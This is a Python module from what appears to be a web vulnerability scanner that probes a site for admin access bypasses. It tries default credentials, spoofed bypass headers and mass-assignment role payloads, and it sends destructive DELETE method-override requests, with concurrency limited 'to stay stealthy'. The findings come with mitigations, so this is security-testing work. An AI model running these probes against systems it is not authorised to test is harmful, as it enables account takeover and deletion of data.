"""
detection/admin_prober.py — Admin access path prober.

Specifically targets admin authentication and authorisation bypass vectors
using techniques derived from the Planit source code analysis.

Checks performed:
  1. Default / common admin credentials against login endpoints
  2. Header-based auth bypass (X-Admin: true, X-Internal: 1, etc.)
  3. Mass assignment on registration (role=admin, isAdmin=true)
  4. Admin path enumeration with forged or missing tokens
  5. HTTP method override (X-HTTP-Method-Override: DELETE)
  6. Parameter pollution on auth endpoints

Each check is clearly labelled and produces a Finding with a
ready-to-use request example.
"""

import asyncio
import json
import logging
from typing import Optional
from urllib.parse import urljoin

import httpx

from config import DEFAULT_TIMEOUT, get_browser_headers
from detection.finding import Finding

log = logging.getLogger(__name__)


# ── Credential lists ──────────────────────────────────────────────────────────

_ADMIN_CREDENTIALS = [
    # username, password
    ("admin",       "admin"),
    ("admin",       "admin123"),
    ("admin",       "password"),
    ("admin",       "password123"),
    ("admin",       "123456"),
    ("admin",       "Admin1234!"),
    ("admin",       "Admin@123"),
    ("admin",       "changeme"),
    ("admin",       "letmein"),
    ("admin",       "qwerty"),
    ("admin",       ""),
    ("administrator","administrator"),
    ("root",        "root"),
    ("root",        "toor"),
    ("superadmin",  "superadmin"),
    ("test",        "test"),
    ("demo",        "demo"),
    ("admin",       "admin_super_secret_2024"),   # from vulnserver .env leak
    ("admin@vulnbank.com", "admin123"),           # vulnserver default
]

# Login endpoint patterns to discover and test
_LOGIN_PATHS = [
    "/api/admin/login",
    "/api/auth/login",
    "/api/login",
    "/admin/login",
    "/login",
    "/auth/login",
    "/api/auth",
    "/api/signin",
    "/api/v1/auth/login",
    "/api/v1/login",
    "/api/admin",
    "/api/admin/auth",
]

# Bypass headers to try on admin-gated endpoints
_BYPASS_HEADERS: list[tuple[str, str]] = [
    ("X-Admin",               "true"),
    ("X-Admin",               "1"),
    ("X-Is-Admin",            "true"),
    ("X-Internal",            "true"),
    ("X-Internal-Request",    "1"),
    ("X-Original-URL",        "/api/admin/users"),
    ("X-Rewrite-URL",         "/api/admin/users"),
    ("X-Forwarded-For",       "127.0.0.1"),
    ("X-Forwarded-Host",      "localhost"),
    ("X-Real-IP",             "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Originating-IP",      "127.0.0.1"),
    ("X-Remote-IP",           "127.0.0.1"),
    ("X-Remote-Addr",         "127.0.0.1"),
    ("X-ProxyUser-Ip",        "127.0.0.1"),
    ("True-Client-IP",        "127.0.0.1"),
    ("Cluster-Client-IP",     "127.0.0.1"),
    ("X-Override-Admin",      "true"),
    ("Admin",                 "true"),
    ("Role",                  "admin"),
    ("Authorization",         "Bearer admin"),
    ("Authorization",         "Basic YWRtaW46YWRtaW4="),  # admin:admin
]

# Mass assignment fields to inject at registration
_MASS_ASSIGN_PAYLOADS = [
    {"role": "admin",        "isAdmin": True},
    {"role": "admin",        "is_admin": True},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"role": "super_admin"},
    {"role": "superadmin"},
    {"verified": True,       "isAdmin": True},
    {"permissions": {"canDeleteEvents": True, "canManageUsers": True}},
]

# Protected admin endpoint to verify access
_ADMIN_VERIFY_PATH = "/api/admin/users"


class AdminProber:
    """
    Attempts to gain admin access through authentication bypass vectors.
    Returns findings for each successful bypass.
    """

    def __init__(
        self,
        client:  httpx.AsyncClient,
        origin:  str,
        timeout: int = DEFAULT_TIMEOUT,
    ):
        self.client  = client
        self.origin  = origin.rstrip("/")
        self.timeout = timeout

    async def run(self) -> list[Finding]:
        findings: list[Finding] = []

        # Run all probes concurrently (but limit concurrency to stay stealthy)
        sem = asyncio.Semaphore(3)

        async def guarded(coro):
            async with sem:
                return await coro

        results = await asyncio.gather(
            guarded(self._test_default_credentials()),
            guarded(self._test_header_bypass()),
            guarded(self._test_mass_assignment()),
            guarded(self._test_method_override()),
            return_exceptions=True,
        )

        for r in results:
            if isinstance(r, list):
                findings.extend(r)

        return findings

    # ── 1. Default credentials ────────────────────────────────────────────────

    async def _test_default_credentials(self) -> list[Finding]:
        findings: list[Finding] = []

        # Find which login endpoints exist
        login_endpoints = await self._find_login_endpoints()
        if not login_endpoints:
            log.debug("[AdminProber] No login endpoints found")
            return []

        for endpoint in login_endpoints:
            for username, password in _ADMIN_CREDENTIALS:
                result = await self._try_credential(endpoint, username, password)
                if result:
                    status, body, token = result
                    findings.append(Finding(
                        vuln_type="Default/Weak Admin Credentials Accepted",
                        severity="CRITICAL",
                        url=endpoint,
                        param="username / password",
                        method="POST",
                        request_example=(
                            f"POST {endpoint}\n"
                            f"Content-Type: application/json\n\n"
                            f'{{"username": "{username}", "password": "{password}"}}\n\n'
                            f"→ HTTP {status} — Login successful"
                            + (f"\n→ Token: {token[:80]}..." if token else "")
                        ),
                        response_indicator=f"HTTP {status} — credentials accepted",
                        evidence_snippet=body[:300],
                        description=(
                            f"The admin login endpoint accepted credentials "
                            f"username={username!r} / password={password!r}. "
                            "Default or weak credentials allow anyone to gain admin access."
                        ),
                        mitigation=(
                            "Change all default credentials. Enforce strong password policy. "
                            "Add MFA to admin accounts. Implement account lockout after N failures."
                        ),
                        cwe="CWE-521",
                        confidence="HIGH",
                    ))
                    break  # one finding per endpoint is enough

        return findings

    async def _find_login_endpoints(self) -> list[str]:
        """Return login endpoint URLs that respond to POST JSON with non-HTML content."""
        found = []
        for path in _LOGIN_PATHS:
            url = self.origin + path
            try:
                # POST a dummy JSON body — real login endpoints accept POST+JSON
                # and return JSON errors/prompts. SPA catch-alls return HTML.
                resp = await self.client.post(
                    url,
                    json={"_probe": True},
                    timeout=self.timeout,
                    follow_redirects=False,
                    headers={**get_browser_headers(url),
                             "Content-Type": "application/json"},
                )
                ct = resp.headers.get("content-type", "").lower()
                # Accept endpoint if it returned non-HTML (JSON error/prompt)
                # OR a 405 Method Not Allowed (GET-only endpoint, still real)
                if resp.status_code == 405:
                    found.append(url)
                elif resp.status_code not in (404, 410) and "html" not in ct:
                    found.append(url)
            except Exception:
                pass
        return found

    async def _try_credential(
        self, endpoint: str, username: str, password: str
    ) -> Optional[tuple[int, str, Optional[str]]]:
        """Returns (status, body, token) on successful login, None otherwise."""
        payloads = [
            {"username": username, "password": password},
            {"email": username,    "password": password},
            {"login": username,    "password": password},
            {"user": username,     "pass": password},
        ]
        for payload in payloads:
            try:
                resp = await self.client.post(
                    endpoint, json=payload,
                    timeout=self.timeout, follow_redirects=False,
                    headers={**get_browser_headers(endpoint),
                             "Content-Type": "application/json"},
                )
                body = ""
                try:
                    body = resp.text[:500]
                except Exception:
                    pass

                if resp.status_code not in (200, 201):
                    continue

                # ── SPA false-positive filter ─────────────────────────────────
                # A React SPA with a catch-all redirect returns 200 text/html for
                # every URL including fake API paths.  A real login endpoint always
                # returns JSON.  Reject any response that is HTML or that doesn't
                # contain a recognisable auth payload.
                ct = resp.headers.get("content-type", "").lower()
                if "html" in ct:
                    log.debug("[AdminProber] Skipping HTML response at %s (SPA catch-all)", endpoint)
                    return None
                if "json" not in ct:
                    log.debug("[AdminProber] Skipping non-JSON response at %s (ct=%s)", endpoint, ct)
                    return None

                # Must contain at least one auth-looking key
                try:
                    data = resp.json()
                except Exception:
                    return None

                token = (data.get("token") or data.get("access_token") or
                         data.get("accessToken") or data.get("jwt"))

                # Require either a token OR an explicit success indicator in the body
                auth_keys = {"token", "access_token", "accessToken", "jwt",
                             "message", "user", "admin", "success"}
                if not (token or any(k in data for k in auth_keys)):
                    return None

                log.info("[AdminProber] Login success at %s with %s / %s",
                         endpoint, username, password)
                return resp.status_code, body, token

            except Exception as exc:
                log.debug("[AdminProber] Credential test error at %s: %s", endpoint, exc)

        return None

    # ── 2. Header-based bypass ────────────────────────────────────────────────

    async def _test_header_bypass(self) -> list[Finding]:
        findings: list[Finding] = []
        verify_url = self.origin + _ADMIN_VERIFY_PATH

        # Baseline: no special headers
        try:
            baseline = await self.client.get(
                verify_url, timeout=self.timeout, follow_redirects=False,
            )
            if baseline.status_code in (200, 201):
                # Already accessible without auth — the path_bruteforcer will catch this
                return []
        except Exception:
            return []

        # Try each bypass header
        for header_name, header_value in _BYPASS_HEADERS:
            try:
                resp = await self.client.get(
                    verify_url,
                    headers={header_name: header_value},
                    timeout=self.timeout,
                    follow_redirects=False,
                )
                if resp.status_code in (200, 201):
                    body = ""
                    try:
                        body = resp.text[:300]
                    except Exception:
                        pass
                    findings.append(Finding(
                        vuln_type="Admin Auth Bypass via HTTP Header",
                        severity="CRITICAL",
                        url=verify_url,
                        param=header_name,
                        method="GET",
                        request_example=(
                            f"GET {verify_url}\n"
                            f"{header_name}: {header_value}\n\n"
                            f"→ HTTP {resp.status_code} (admin access granted)"
                        ),
                        response_indicator=f"HTTP {resp.status_code} with header {header_name}: {header_value}",
                        evidence_snippet=body,
                        description=(
                            f"Adding the header '{header_name}: {header_value}' bypassed "
                            f"admin authentication on {verify_url}. The server trusts "
                            "client-supplied headers to determine access level."
                        ),
                        mitigation=(
                            "Never trust client-supplied headers for access control decisions. "
                            "All authorization must be based on verified session tokens only."
                        ),
                        cwe="CWE-287",
                        confidence="HIGH",
                    ))
                    break  # one bypass finding is enough

            except Exception as exc:
                log.debug("[AdminProber] Header bypass error: %s", exc)

        return findings

    # ── 3. Mass assignment on registration ────────────────────────────────────

    async def _test_mass_assignment(self) -> list[Finding]:
        findings: list[Finding] = []
        register_paths = [
            "/api/register", "/api/auth/register",
            "/api/signup", "/api/auth/signup",
            "/api/user/register", "/register",
        ]

        import random, string
        rand = "".join(random.choices(string.ascii_lowercase, k=6))

        for path in register_paths:
            url = self.origin + path

            for extra_fields in _MASS_ASSIGN_PAYLOADS:
                base_payload = {
                    "username": f"wscan_{rand}",
                    "email":    f"wscan_{rand}@example.com",
                    "password": "WscanTest1!",
                    "name":     "WscanTest",
                    **extra_fields,
                }
                try:
                    resp = await self.client.post(
                        url, json=base_payload,
                        timeout=self.timeout, follow_redirects=False,
                        headers={**get_browser_headers(url),
                                 "Content-Type": "application/json"},
                    )
                    if resp.status_code not in (200, 201):
                        continue

                    body = ""
                    try:
                        body = resp.text[:500]
                    except Exception:
                        pass

                    # Check if extra fields were reflected back in response
                    reflected = any(
                        str(v).lower() in body.lower()
                        for k, v in extra_fields.items()
                        if k in ("role", "isAdmin", "is_admin")
                    )

                    if reflected or "admin" in body.lower():
                        findings.append(Finding(
                            vuln_type="Mass Assignment — Privilege Escalation via Registration",
                            severity="CRITICAL",
                            url=url,
                            param=", ".join(extra_fields.keys()),
                            method="POST",
                            request_example=(
                                f"POST {url}\n"
                                f"Content-Type: application/json\n\n"
                                f"{json.dumps(base_payload, indent=2)}\n\n"
                                f"→ HTTP {resp.status_code} — extra fields accepted"
                            ),
                            response_indicator=f"HTTP {resp.status_code} — admin fields reflected in response",
                            evidence_snippet=body[:300],
                            description=(
                                f"Sending extra fields {list(extra_fields.keys())} in a "
                                "registration request resulted in them being accepted and "
                                "reflected back. An attacker can register as admin directly."
                            ),
                            mitigation=(
                                "Use an explicit allowlist of accepted registration fields. "
                                "Never bind raw request body to model objects without filtering. "
                                "Use DTOs or explicit field assignment."
                            ),
                            cwe="CWE-915",
                            confidence="HIGH",
                        ))
                        return findings  # one is enough

                except Exception as exc:
                    log.debug("[AdminProber] Mass assignment error at %s: %s", url, exc)

        return findings

    # ── 4. HTTP method override ───────────────────────────────────────────────

    async def _test_method_override(self) -> list[Finding]:
        """
        Test X-HTTP-Method-Override to convert a POST into a DELETE/PUT.
        Useful for finding endpoints that restrict methods but honour override headers.
        """
        findings: list[Finding] = []
        test_paths = [
            ("/api/admin/users/1", "DELETE"),
            ("/api/events/1",      "DELETE"),
            ("/api/users/1",       "DELETE"),
        ]

        for path, override_method in test_paths:
            url = self.origin + path
            try:
                # Baseline: normal DELETE (should be 401/403/404)
                baseline = await self.client.request(
                    "DELETE", url, timeout=self.timeout, follow_redirects=False,
                )
                if baseline.status_code in (200, 201, 204):
                    continue  # Already accessible — not an override bypass

                # Override: POST with X-HTTP-Method-Override: DELETE
                resp = await self.client.post(
                    url,
                    headers={"X-HTTP-Method-Override": override_method,
                             "X-Method-Override":      override_method,
                             "X-Override":             override_method},
                    timeout=self.timeout,
                    follow_redirects=False,
                )
                if resp.status_code in (200, 201, 204):
                    body = ""
                    try:
                        body = resp.text[:300]
                    except Exception:
                        pass
                    findings.append(Finding(
                        vuln_type="HTTP Method Override Accepted",
                        severity="HIGH",
                        url=url,
                        param="X-HTTP-Method-Override",
                        method="POST",
                        request_example=(
                            f"POST {url}\n"
                            f"X-HTTP-Method-Override: {override_method}\n\n"
                            f"→ HTTP {resp.status_code} (treated as {override_method})"
                        ),
                        response_indicator=f"POST + X-HTTP-Method-Override: {override_method} → HTTP {resp.status_code}",
                        evidence_snippet=body,
                        description=(
                            f"The server honoured X-HTTP-Method-Override: {override_method}, "
                            "converting a POST request into a destructive action. "
                            "This bypasses any firewall rules that block DELETE/PUT methods."
                        ),
                        mitigation=(
                            "Disable X-HTTP-Method-Override support unless strictly required. "
                            "If needed, validate the calling user has permission for the overridden method."
                        ),
                        cwe="CWE-650",
                        confidence="HIGH",
                    ))

            except Exception as exc:
                log.debug("[AdminProber] Method override error at %s: %s", url, exc)

        return findings
